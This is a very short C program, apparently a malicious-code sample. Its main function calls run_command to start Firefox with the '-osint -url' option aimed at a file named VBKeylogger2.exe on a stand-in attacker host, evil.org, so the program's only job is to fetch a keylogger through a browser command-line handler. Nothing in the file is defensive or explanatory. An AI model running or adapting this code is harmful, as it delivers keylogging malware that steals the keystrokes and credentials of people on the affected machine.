#include "helpers.h"


int main() {
    char filepath[] = "firefox.exe -osint -url \"https://www.evil.org/VBKeylogger2.exe\"";
    return run_command(filepath);
}